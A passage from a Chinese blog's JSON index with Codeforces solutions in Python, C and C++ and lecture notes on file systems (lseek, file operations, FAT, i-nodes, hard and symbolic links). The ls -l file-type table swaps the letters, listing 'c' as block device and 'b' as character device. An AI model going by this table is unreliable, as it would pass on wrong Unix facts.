Task","slug":"算法竞赛/Codeforce/1000/Codeforce-String-Task","date":"2025-03-26T13:02:00.000Z","updated":"2025-04-02T11:06:33.027Z","comments":true,"path":"2025/03/26/算法竞赛/Codeforce/1000/Codeforce-String-Task/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-String-Task/","excerpt":"","text":"题目描述 思路代码Python1234567891011121314word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]# deletes all the vowelsword = ''.join(c for c in word if c.upper() not in V)# replaces all uppercase consonants with corresponding lowercase ones.word = word.lower()# inserts a character \".\" before each consonant,word = ''.join('.' + c for c in word)print(word) 优化： 12345word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]print(''.join('.' + c.lower() for c in word if c.upper() not in V)) C1 C++1","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Next Round","slug":"算法竞赛/Codeforce/800/Codeforce-Next-Round","date":"2025-03-25T21:17:50.000Z","updated":"2025-04-02T11:05:31.486Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Next-Round/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Next-Round/","excerpt":"","text":"题目描述 思路先统计前 k 个分数中大于 0 的数量。因为分数是递减排列的，只需继续统计从第 k 个位置开始，所有与第 k 个分数相等的连续分数个数。最后的总合就是结果。 代码Python12345678910111213141516171819n_k = input().split()n = int(n_k[0])k = int(n_k[1])n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_list[:k] for i in range(k,n): if n_list[i] == comp: n1_list.append(n_list[i]) else: breakcount = sum(1 for x in n1_list if x &gt; 0)# print(n1_list)print(count) 优化： 1234n, k = map(int, input().split())scores = list(map(int, input().split()))threshold = scores[k - 1]print(sum(s &gt;= threshold and s &gt; 0 for s in scores)) 用numpy的： 1234567import numpy as npn, k = map(int, input().split())scores = np.array(list(map(int, input().split())))threshold = scores[k - 1]result = np.sum((scores &gt;= threshold) &amp; (scores &gt; 0))print(result) C12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int main() { int n, k; scanf(\"%d %d\", &amp;n, &amp;k); int scores[100]; // 假设最大不超过 100 个分数 for (int i = 0; i &lt; n; i++) { scanf(\"%d\", &amp;scores[i]); } int threshold = scores[k - 1]; // 第 k 个选手的分数（索引从 0 开始） int count = 0; // 前 k 个中统计 &gt;0 且 &gt;= threshold 的分数 for (int i = 0; i &lt; k; i++) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } // 从第 k 个开始，统计连续等于 threshold 的（也必须 &gt;0） for (int i = k; i &lt; n; i++) { if (scores[i] == threshold &amp;&amp; scores[i] &gt; 0) { count++; } else { break; } } printf(\"%d\\n\", count); return 0;} C++12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; scores[i]; } int threshold = scores[k - 1]; int count = 0; for (int i = 0; i &lt; n; ++i) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } cout &lt;&lt; count &lt;&lt; endl; return 0;} 用ranges： 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;ranges&gt;using namespace std;namespace ranges = std::ranges;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int&amp; score : scores) { cin &gt;&gt; score; } int threshold = scores[k - 1]; auto advancers = scores | ranges::views::filter([threshold](int x) { return x &gt;= threshold &amp;&amp; x &gt; 0; }); cout &lt;&lt; ranges::distance(advancers) &lt;&lt; endl; return 0;} Remark1. 如果只是 1n,k = input().split() 的话只会将n,k赋值成2个string，而不是int，所以需要这一步将它们转成2个int： 123n_k = input().split()n = int(n_k[0])k = int(n_k[1]) list那里的处理也是同理。 2. 如果直接写 12345678n_list = list(map(int, input().split()))comp = n_list[k-1]for i in range(k,n): if n_list[i] == comp: n_list.append(n_list[i]) else: break 的话，会导致遍历一个列表的同时又在修改它，会导致结果不可控。 但就算是改成了 12345678910n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_listfor i in range(k,n): if n1_list[i] == comp: n_list.append(n1_list[i]) else: break 也不对，因为在python里n1_list 并不是 n_list 的复制品，而只是同一个列表的两个名字。这样只是让 n1_list 和 n_list 指向同一个列表对象，修改任何一个，都会影响另一个。所以会出现跟之前一模一样的结果。 创建独立的副本需要： 123456n1_list = n_list[:]# 或n1_list = list(n_list)# 或import copyn1_list = copy.copy(n_list) （注意：python里的list[a:b]是前闭后开，所以这个不包含list[b]） 3. 假如这道题的input是乱序的，那么需要先将input排序了再进行后续操作。 python的话非常简单： 12345678910111213input = [3, 1, 4, 1, 5, 9]#升序：input.sort() # 原地排序，修改 input 本身# 或者input = sorted(input) # 返回新排序后的列表#降序：input.sort(reverse=True)# 或者input = sorted(input, reverse=True) c就很麻烦了： 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int cmp(const void *a, const void *b) { return (*(int *)a - *(int *)b); // 升序 // return (*(int *)b - *(int *)a); // 降序}int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); qsort(arr, n, sizeof(int), cmp); // 排序调用 for (int i = 0; i &lt; n; i++) { printf(\"%d \", arr[i]); } return 0;} 因为 qsort()（通用的排序函数）是泛型函数，它不能直接比较 int 或 float，我们必须手动告诉它“怎么比较两个值”。 相比之下c++就会方便很多，因为有内置的函数： 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // 降序会需要using namespace std;int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); sort(arr, arr + n); // 默认升序排序 // sort(arr, arr + n, greater&lt;int&gt;()); 降序 for (int i = 0; i &lt; n; i++) { cout &lt;&lt; arr[i] &lt;&lt; \" \"; } return 0;} 也可以直接用cpp的 vector&lt;int&gt; 1234567891011121314151617#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main() { vector&lt;int&gt; v = {3, 1, 4, 1, 5, 9}; sort(v.begin(), v.end()); // 升序 // sort(v.begin(), v.end(), greater&lt;int&gt;()); // 降序 for (int x : v) { cout &lt;&lt; x &lt;&lt; \" \"; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce-Bit++","slug":"算法竞赛/Codeforce/800/Codeforce-Bit","date":"2025-03-25T17:57:32.000Z","updated":"2025-04-02T11:05:16.379Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Bit/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Bit/","excerpt":"","text":"题目描述 思路对于每一行命令检测+是否在里面就好。 代码Python123456789n = int(input())x=0for _ in range(n): op = input() if \"+\" in op: x += 1 else: x -= 1print(x) C1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n, x = 0; scanf(\"%d\", &amp;n); char op[5]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", op); if (strchr(op, '+')) { x += 1; } else { x -= 1; } } printf(\"%d\\n\", x); return 0;} C++","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Team","slug":"算法竞赛/Codeforce/800/Codeforce-Team","date":"2025-03-25T17:42:06.000Z","updated":"2025-04-02T11:05:46.927Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Team/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Team/","excerpt":"","text":"题目描述 一共有 n 道题目，而对于每道题，他们会选择是否去做这题：只有当三个人中至少有两个人对这题有把握时，他们才会决定去做。 思路直接计算每行的和是否大于等于2。 代码Python123456789n = int(input()) count = 0 for _ in range(n): a, b, c = map(int, input().split()) if a + b + c &gt;= 2: count += 1 print(count) C1234567891011121314151617#include &lt;stdio.h&gt;int main() { int n, a, b, c; int count = 0; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) { scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c); if (a + b + c &gt;= 2) { count++; } } printf(\"%d\\n\", count); return 0;} C++123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main(){ int n; cin &gt;&gt; n; int a,b,c; int count=0; for( int i=0; i &lt; n; i++){ cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(a+b+c &gt;1){ count +=1; } } cout &lt;&lt; count; return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Way Too Long Words 题解","slug":"算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words","date":"2025-03-25T17:28:41.000Z","updated":"2025-04-02T11:04:46.144Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","excerpt":"","text":"题目描述 简单来讲就是需要”简化“长单词。 思路先判断单词长度。如果小于等于10就不用管，如果超过10，则写成：首字母 + 中间的字母数量 + 末尾字母。 代码Python1234567n = int(input())for _ in range(n): word = input() if len(word) &gt; 10: print(word[0] + str(len(word) - 2) + word[-1]) else: print(word) C123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; scanf(\"%d\", &amp;n); char word[101]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", word); int len = strlen(word); if (len &gt; 10) { printf(\"%c%d%c\\n\", word[0], len - 2, word[len - 1]); } else { printf(\"%s\\n\", word); } } return 0;} C++12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int n; cin &gt;&gt; n; string word; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; word; int len = word.length(); if (len &gt; 10) { cout &lt;&lt; word[0] &lt;&lt; len - 2 &lt;&lt; word[len - 1] &lt;&lt; endl; } else { cout &lt;&lt; word &lt;&lt; endl; } } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"GBS 7 Dateisystem 文件系统","slug":"TUM info 笔记/GBS/GBS-7-Dateisystem-文件系统","date":"2025-03-24T20:53:38.000Z","updated":"2025-04-26T18:31:10.127Z","comments":true,"path":"2025/03/24/TUM info 笔记/GBS/GBS-7-Dateisystem-文件系统/","permalink":"https://archer-baiyi.github.io/2025/03/24/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-7-Dateisystem-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"操作系统基础相关笔记","text":"Einführung首先我们需要先明确为什么需要文件系统： 进程在运行期间只能使用其虚拟地址空间来存储数据：容量有限。 当进程结束时，其虚拟地址空间中的数据会丢失：无法实现持久的、长期的数据存储。 在虚拟进程地址空间中存储数据只允许有限的共享访问：不能实现同时并行使用。 所以我们需要文件系统来提供更高级别，更持久、更可靠并且可共享的数据存储功能。 也就意味着我们会对文件系统有着以下要求： 提供存储空间以容纳大量数据（Speicherplatz für (sehr) große Datenmengen bereitstellen） 防止数据丢失（Datenverlust vermeiden） 支持并发访问数据（Nebenläufigen Zugriff auf Daten ermöglichen） 多个进程应能够同时访问数据。 文件系统的基本作用是将硬盘上的原始数据块组织成结构良好的文件，使得用户和程序可以方便地存取数据。 具体的任务包括： 可以描述文件的数据结构（Datenstrukturen zur Beschreibung von Dateien） 实现文件（Implementierung der Dateien） 命名（Benennung） 允许访问文件（Zugriffe auf Dateien ermöglichen） 防止未授权访问（Schutz vor unberechtigten Zugriffen） 常见的文件系统有： FAT-16/32 (DOS) 老式的微软文件系统 NTFS (Windows NT) 微软当前主流的文件系统 Ext2/3/4 (Linux) Linux 系统中广泛使用的文件系统系列（Ext4是目前主流） 硬盘硬盘作为长期存储的媒介，可以被看作是一串固定大小的线性数据块序列（ eine lineare Sequenz von Blöcken fester Größe ）。这里的块（Block）就是硬盘读写的基本单位（Einheit）。这里的块的大小是由操作系统决定的，和硬盘的sector没有直接的大小关系。 而为了更好的管理硬盘的存储空间，我们需要操作系统对硬盘属性进行虚拟化，也就是所谓的文件概念（Datei-Konzept）： 文件是逻辑上的管理单元。（Dateien sind logische Verwaltungs-Einheiten） 文件可以持久地存储任意信息。（Dateien speichern beliebige Informationen persistent (dauerhaft)） 文件系统对块的存储位置、空闲状态等进行了抽象处理。（Datei abstrahiert davon, wo die Blöcke gespeichert sind, welche Blöcke frei sind usw.） 进程可以通过系统调用来创建、写入、读取和删除文件。（erstellen, schreiben, lesen, löschen） 文件不仅被用户程序使用，也被系统软件使用。（ Dateien werden sowohl von Benutzerprogrammen als auch von der Systemsoftware verwendet） 文件 （Dateien）我们首先通过用户视角来了解一下文件系统：就从我们日常接触的文件开始。 文件作为被管理的单位（zu verwaltende Einheiten），可以被不同的进程使用。所有文件都必须有名字，没有统一的命名规则。一般情况下名字会由2部分组成：名字（Name）和扩展名（Extension）。而有些系统（比如说Windows）会解析扩展名，有些则不会（比如UNIX）。 文件可以采用三种不同的结构方式： 非结构化（Unstrukturiert） 操作系统只把文件当作一串字节（eine Folge von Bytes）（适用于 UNIX 和 Windows）来看待，它不会尝试去理解文件里面到底是什么内容。 优点：用户程序有更大的灵活性 固定大小记录的序列（Sequenzen von Einträgen fester Größe） 每条记录有固定的大小和结构，比如每行只能写 80 个字符。现代的操作系统已经很少使用这种方式了。 具有不同大小记录的树结构（Ein Baum mit Einträgen unterschiedlicher Größe） 每条记录都有一个Key，这些Key都是有序存储的。适合在大型计算机的操作系统（Großrechner-BS ）中用于处理大量数据。 文件类型（Dateitypen）操作系统支持多种文件类型： 普通文件（ Dateien，regular files）： 包含用户数据的文件，比如说： 文本文件（Text-Dateien）： Bestehen aus Zeilen, die durch carriage return （回车符，\\r）und/oder linefeed Zeichen（换行符，\\n） abgeschlossen sind. 二进制文件（Binärdateien）：具有特定格式，比如说可执行文件、压缩包等。 目录（Verzeichnisse，directories）： 是用于组织和管理文件系统中结构的系统文件。 块设备文件（Block Special Files） 字符设备文件（Character Special Files） 在linux种可以用 ls -l 来查看文件类型： 第一位字符 文件类型 - 普通文件 d 目录 c 块设备文件 b 字符设备文件 例子： 1234drwxr-xr-x 2 user user 4096 Mar 26 test_folder-rw-r--r-- 1 user user 1234 Mar 26 notes.txtcrw-rw---- 1 root tty 4, 0 Mar 26 /dev/tty0brw-rw---- 1 root disk 8, 0 Mar 26 /dev/sda 可执行文件的结构： 压缩文件的结构： 文件访问方式（Dateizugriff）顺序访问（Sequential access）（只有在很老的操作系统里才会出现了。） 在这种访问下，进程需要按顺序读取文件中的字节（或记录），文件的部分内容不能跳过，适合磁带类存储设备。 比如说读一本书的时候只能一页一页往后翻，不能直接跳到第50页。 随机访问（Random-access）进程可以按任意顺序读取文件中的字节（或记录），在数据库系统中尤其重要（快速定位记录）。 UNIX 系统中，lseek 系统调用可以改变“读写指针”位置： 1lseek(fd, 1024, SEEK_SET); fd是文件描述符，1024是偏移量（offset）（单位是Byte），SEEK_SET 则是定位方式，有几种选择： 常量名 含义 SEEK_SET 从文件开头开始偏移 offset 字节 SEEK_CUR 从当前位置开始偏移 SEEK_END 从文件末尾开始偏移 （offset需要调整为负数） 例子： 12345678910111213141516171819202122232425262728293031#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123; int fd; // 文件描述符 char buf[128]; // 缓冲区，用于读取128字节内容 // 打开文件 &quot;myfile.txt&quot;，只读方式 fd = open(&quot;myfile.txt&quot;, O_RDONLY); if (fd &lt; 0) // 如果打开失败，退出 return EXIT_FAILURE; // 将文件读写位置移动到从文件头开始的第1024个字节 if (lseek(fd, 1024, SEEK_SET) &lt; 0) return EXIT_FAILURE; // 从当前位置读取128字节到缓冲区buf中 if (read(fd, buf, 128) &lt; 0) return EXIT_FAILURE; // 打印读取到的内容 printf(&quot;%s\\n&quot;, buf); // 关闭文件 close(fd); // 正常退出 return EXIT_SUCCESS;&#125; 文件属性（Dateiattribute）每份文件除了文件名和文件内容外还会附带一些其他信息：元信息（Meta-Informationen）。 元信息包含： 对文件的访问权限 比如说在UNIX里，权限赋予对象分成 所有者（Owner）、用户组（Group）、所有人（All）。而权限种类有r（读取）、w（写入）、x（执行） 例子： 1-rwxr--r-- 标志位（flags）：控制文件的某些属性 比如说可以将文件设置为隐藏、标识为二进制或归档文件等。 详见： 文件操作（Datei-Operationen）常见的文件操作都是通过系统调用提供的： 创建和删除文件 open （打开）: 在访问一个文件之前，必须先打开它。这会让操作系统把文件属性和其他信息加载到内存中，方便快速处理。open() 系统调用返回一个文件描述符（file descriptor），这是一个小的整数，用来标识这个打开的文件。 unlink （删除） 后续对文件的访问（通过文件描述符） close （关闭） 使用文件描述符来关闭文件，释放内部数据结构资源。 read （读取） 指定要读取的数据以及一个缓冲区（buffer），读取的内容将被放入该缓冲区。 一定要提前创建一个缓冲区！ write （写入） 将数据写入到当前文件指针所在的位置，注意原有数据可能会被覆盖。 seek （定位） 移动文件指针到指定位置（之后可以从该位置读取或写入）。（见上面随机访问那里的例子） 代码例子： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // 包含 open() 的相关定义和文件权限#include &lt;unistd.h&gt; // 包含 read(), write(), close() 的声明#define BUF_SIZE 4096 // 定义缓冲区的大小int main (int argc, char *argv[]) &#123; int fd_in, fd_out, count; // 2个文件描述符 和 读写字节数计数器 char buf[BUF_SIZE]; // 缓冲区 // 如果参数个数不为3（程序名 + 输入文件 + 输出文件），则失败退出 if (argc != 3) return EXIT_FAILURE; // 打开输入文件，只读模式（O_RDONLY） if ((fd_in = open(argv[1], O_RDONLY)) == -1) return EXIT_FAILURE; // 打开或创建输出文件，只写模式，权限为用户可读写（rw- --- ---） if ((fd_out = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)) == -1) return EXIT_FAILURE; // 读取输入文件的内容并写入到输出文件中，直到读完 while ((count = read(fd_in, buf, BUF_SIZE)) &gt; 0) &#123; // 如果写入失败或未能写入全部内容，返回失败 if (write(fd_out, buf, count) &lt;= 0) return EXIT_FAILURE; &#125; // 关闭两个文件描述符 close(fd_in); close(fd_out); return EXIT_SUCCESS; // 成功结束程序&#125; 目录（Verzeichnisse）文件系统通过目录来组织文件。而目录本质上是一个特殊的文件，它只包含管理信息（比如：文件名、路径、指针等）。目录使文件系统支持层级管理（hierarchische Verwaltung），让结构更清晰、查找更高效。 下面这两种是比较常见的目录结构： 1. 单层目录结构（Single-Level Verzeichnisstrukturen） 在这种结构里只有一个目录（根目录，root directory）用于存放所有文件。目前依然在一些嵌入式系统中使用。 优点：文件可以很快被找到（因为都在同一个地方）。 缺点：所有用户共享同一个目录，没有分层结构。 2. 层次型目录结构（Hierarchische Verzeichnisstrukturen） 这种会将相关的文件以分层方式组织在目录中，每个用户拥有自己专属的主目录，并可包含子目录。 路径名（Pfadnamen）路径名是为了在树状结构的文件系统中为文件命名，一般分3种： 1. 绝对路径名（Absolute Pfadnamen） 路径从根目录（Root-Verzeichnis）开始，一直到目标文件。 注意：UNIX/Linux 中用 / ，Windows 中用 \\ 。 例子： 1/tum/git/gbs/uebungsbetrieb/ws18/09/c-files/mem.c 2. 相对路径名（Relative Pfadnamen） 路径是相对于当前工作目录（Current Working Directory）而言的。 比如当前路径是 1/tum/git/gbs/uebungsbetrieb/ws18/09 的时候，就可以这样引用文件：123blatt09.pdf或者c-files/mem.c 3. 特殊路径 . 表示当前目录，.. 表示上一级目录。 例子： 假设当前路径是 1ws18/09/ 可以用 12cp ../08/gbsuebung.cls .# 从当前目录的上一级目录中的 08 子目录里，复制 gbsuebung.cls 文件到当前目录中 文件系统从现在开始我们从实现角度（Implementierungs-Sicht）来了解文件系统：它内部是如何实现各种功能的。 文件系统布局（Dateisystem-Layout）硬盘会被划分为多个分区（Partitionen），每个分区可以独立存储一个文件系统，彼此之间互不影响。 位于 Sektor 0 的是主引导记录（MBR，Master Boot Record）。里面存储了一个分区表（Partitions-Tabelle），用于纪录每个分区的起始和结束地址。 在启动电脑时（Booten），BIOS（或现代的 UEFI）会读取 MBR，执行 MBR 程序，然后根据分区表（Partitions-Tabelle）定位到活动分区（aktiven Partition），读取并执行该分区的第一个块 Boot Block 中的代码，引导操作系统加载。 每个分区内部的结构会随着文件系统的不同而变化。 上面图片里展示的是UNIX/Linux中文件系统的例子： 超级块（Superblock） 存储关于整个文件系统的关键信息，包括 Magic Number（识别文件系统类型的标识）, Anzahl der Blöcke, etc. 空闲块信息（Informationen über freie Blöcke） （上一章的内容）可以通过位图（Bitmap）或者指针链表（Pointer List）实现。 文件描述符集合（i-nodes） 文件和目录 文件的存储与实现方式（Implementierung von Dateien）文件系统管理那些用于保存文件内容的磁盘块（Blöcke），但每个文件的数据都被分成多个块，系统怎么样可以知道这些块在哪儿呢？ 以下是管理文件内容所用的三种主要实现方案： 连续分配（Contiguous Allocation）文件被视为硬盘上一串连续的块，也就是说文件的所有数据块在物理磁盘上是挨在一起的（如下图）。 优点： 实现简单（Einfache Implementierung） 读取性能高（Lesen ist sehr performant） 由于数据连续，只需一次磁头定位就可以一次性把整个文件读完，非常高效。 缺点： 外部碎片问题（Externe Fragmentierung） 指随着文件的创建与删除（也就是外部原因）会产生很多小块，导致很难找到一大块连续空间给新文件。（如下图所示） （interne Fragmentierung 指的是想Buddy Algorithm那样算法本身导致的碎片化。） 所以比较适合只读介质（Read-Only-Medien），比如说CD-ROM，DVD，BluRay-Disks 链式分配（Linked List Allocation）使用一个链表管理所以文件使用的块，每个块的开头包含指向下一个块的指针。 优点： 不会浪费空间 不像连续分配那样需要一整段连续空闲区域，所有零散的空闲块都可以利用 缺点： 随机访问性能差（Niedrige Performance bei Random-Access） 因为如果要访问第 n 块，必须先读取完前 n-1 块。 每个块要占用一点空间存指针 导致可用空间不是标准的 2 的幂（keine 2er-Potenz）。 与操作系统块大小兼容性差 因为许多系统要求块大小是固定的（例如 512B、1024B、2048B 等），指针占了空间后可能导致不便于按块读取。 针对提到的这些问题我们可以在此基础上进行一点改良： FAT 文件分配表（Linked List Allocation mit File Allocation Table）我们现在将所有指针集中存储在一张表中（FAT），放在主存（Hauptspeicher）中管理。 例子： 我们现在有2份文件： A：4, 7, 2, 10, 12 (-1 = Ende der Liste) B: 6, 3, 11, 14 (-1) 优点： 每个块不会浪费存储空间（kein Verschnitt） 随机访问（Random-Access）更快 只需要在内存中操作表即可 缺点： FAT 表必须常驻内存（RAM），会消耗大量内存。（磁盘空间越大FAT也越大） i-nodes（索引节点）每个文件都由一个i-node数据结构来表示，i-node中会包含文件的元数据（Dateiattribute）以及磁盘块的地址（ Adressen）。 优点： 内存占用低 因为只需将打开的文件的i-node加载到内存中。 可扩展性强 所需内存空间只与“同时打开的文件数”有关，而不是整个磁盘容量。 缺点： i-node 能存的地址数量是固定的 为了解决这个问题可以用多级间接地址： 比如说一级间接、二级间接、三级间接（Indirekte, doppelt indirekte und dreifach indirekte Blöcke），即最后的地址不是数据块，而是指向一个包含更多地址的“块地址表”（即指针块）。 在 ext2/3/4 中，每个 inode 都包含 12 个直接指向文件数据块的 direct block 指针。 目录（Verzeichnissen）操作系统需要通过解析路径名来找到硬盘上的实际文件位置。 一个目录其实就是一组目录项（Verzeichniseintrag，directory entry）的集合。当操作系统通过一个路径打开文件时，会挨个查找对应的目录项。 一个目录项会包含以下信息： 文件名 定位信息（Adress-Informationen, um die gesuchte Datei zu lokalisieren） 文件属性（Datei-Attribute） （注意，目录项和文件是2个不同的东西。目录项实际上只是一条纪录，用于指向一个文件或者子目录，并不会存储文件内容（用于导航）。而文件是实际存储数据的对象） 文件属性的存储有2种常见的方式： 1. 直接存储在目录项中： 每个目录项不仅包含文件名，还直接包含这个文件的属性信息。 2. 存储在 i-nodes 中： 每个目录项只包含文件名以及一个指向 i-node 的引用（编号或指针），文件的所有属性都集中保存在 i-node 中。 文件名的存储因为我们希望可以使用任意长度的文件名，所以需要考虑这些不同长度的文件名该怎么存储。 首先想到的便是 1. 固定文件名长度，比如说限制每份文件的文件名在255个字符以内。但是这样一来肯定需要给每份文件的文件名255个字符的位置，由于不是每份文件的名字都有这么长，很容易导致内存或者磁盘空间的浪费。 所以我们可以根据这个问题将这个方法改良一点： 2. 允许文件使用任意长度的文件名，然后专门用一块空间记录当前文件名的长度。（如下图） 但是这种方法同样也有一个很大的问题：因为文件名长度的不同意，创建和删除文件容易导致存储空间碎片化。为了解决这个问题我们可以考虑将所有的文件名集中存储，也就是: 3. 只存储文件属性以及一个指向堆（Heap）里存储文件名位置的指针。（如下图） 尽管已经改善很多了，但这个方案依旧不够完美：在包含大量条目的目录中查找文件会很慢（Suchen von Dateien in Verzeichnissen mit vielen Einträgen ist langsam）。所以我们可以 4. 在3的基础上引入哈希表来提高索引效率： 在每个目录中使用一个哈希表，通过对文件名进行哈希计算来得到目录项的索引。目录项中的哈希冲突（Kollisionen）则通过链表来处理。 链接（Links）为了让（不同）用户在不同路径下可以打开同一份文件，我们需要引入链接这个机制。 链接分为2种： 硬链接（Hard Links） 目录项不是直接指向文件数据，而是指向i-node，允许多个目录项指向同一个 i-node。注意，在硬链接里没有“主链接”或“次链接”的区别，所有硬链接是平等的。每个 i-node 会记录引用计数（ref count），当引用计数归零时，说明没有目录再指向它，就可以删除这个文件了。 （这也解释了 UNIX 删除命令叫 unlink()，因为它实际上是取消一个目录项到 i-node 的链接，而不是马上删除文件。） 软链接/符号链接（Symbolic Links）创建一个特殊类型的文件，里面保存的是目标文件的路径名。 软链接类似于Windows里的快捷方式，但并不完全一样。软连接是文件系统级别支持，而快捷方式则是应用层支持。这意味着系统层面会自动解析软链接，但是Windows里的快捷方式需要Shell或资源管理器解析。 